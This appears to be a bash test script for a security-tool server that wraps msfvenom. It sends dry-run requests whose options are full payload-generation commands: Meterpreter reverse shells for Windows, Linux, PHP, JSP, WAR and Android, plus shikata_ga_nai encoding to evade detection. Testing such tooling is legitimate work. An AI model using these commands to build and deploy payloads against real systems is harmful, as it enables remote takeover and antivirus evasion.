#!/bin/bash
# Tool: msfvenom
# Skill: skills/msfvenom/SKILL.md
# Endpoint: POST /api/tools/dry-run | /api/tools/run
# Descrição: Geração de payloads e encoders do Metasploit Framework
set -euo pipefail

BASE_URL="${MCP_BASE_URL:-http://localhost:3000}"
TARGET="${TEST_TARGET:-127.0.0.1}"
PASS=0; FAIL=0

pass() { echo "[PASS] $1"; ((PASS++)); }
fail() { echo "[FAIL] $1: $2"; ((FAIL++)); }

dry() {
  local desc="$1"; local options="$2"
  local R
  R=$(curl -sf -X POST "$BASE_URL/api/tools/dry-run" \
    -H "Content-Type: application/json" \
    -d "{\"tool\":\"msfvenom\",\"options\":\"$options\"}") || { fail "$desc" "curl error"; return; }
  echo "$R" | grep -q '"command"' \
    && pass "$desc" \
    || fail "$desc" "no command: $R"
}

echo "=== msfvenom ==="

echo "-- dry-run: Windows payloads --"
dry "Win32 reverse TCP EXE"   "-p windows/meterpreter/reverse_tcp LHOST=$TARGET LPORT=4444 -f exe -o /tmp/payload.exe"
dry "Win64 reverse TCP EXE"   "-p windows/x64/meterpreter/reverse_tcp LHOST=$TARGET LPORT=4444 -f exe -o /tmp/payload64.exe"
dry "Win DLL payload"         "-p windows/meterpreter/reverse_tcp LHOST=$TARGET LPORT=4444 -f dll -o /tmp/inject.dll"
dry "Win PowerShell payload"  "-p windows/x64/meterpreter/reverse_https LHOST=$TARGET LPORT=443 -f psh -o /tmp/shell.ps1"

echo ""
echo "-- dry-run: Linux payloads --"
dry "Linux x86 ELF"           "-p linux/x86/meterpreter/reverse_tcp LHOST=$TARGET LPORT=4444 -f elf -o /tmp/payload_linux"
dry "Linux x64 ELF"           "-p linux/x64/meterpreter/reverse_tcp LHOST=$TARGET LPORT=4444 -f elf -o /tmp/payload_linux64"

echo ""
echo "-- dry-run: Web payloads --"
dry "PHP reverse shell"       "-p php/meterpreter_reverse_tcp LHOST=$TARGET LPORT=4444 -f raw -o /tmp/shell.php"
dry "JSP payload"             "-p java/jsp_shell_reverse_tcp LHOST=$TARGET LPORT=4444 -f raw -o /tmp/shell.jsp"
dry "WAR payload"             "-p java/jsp_shell_reverse_tcp LHOST=$TARGET LPORT=4444 -f war -o /tmp/shell.war"

echo ""
echo "-- dry-run: Android --"
dry "APK payload"             "-p android/meterpreter/reverse_tcp LHOST=$TARGET LPORT=4444 -f apk -o /tmp/malicious.apk"

echo ""
echo "-- dry-run: encoding --"
dry "encoded x86 shikata"     "-p windows/meterpreter/reverse_tcp LHOST=$TARGET LPORT=4444 -e x86/shikata_ga_nai -i 3 -f exe -o /tmp/encoded.exe"
dry "list payloads"           "--list payloads"
dry "list formats"            "--list formats"
dry "list encoders"           "--list encoders"

echo ""
echo "Results: PASS=$PASS FAIL=$FAIL"
[ "$FAIL" -eq 0 ] && exit 0 || exit 1
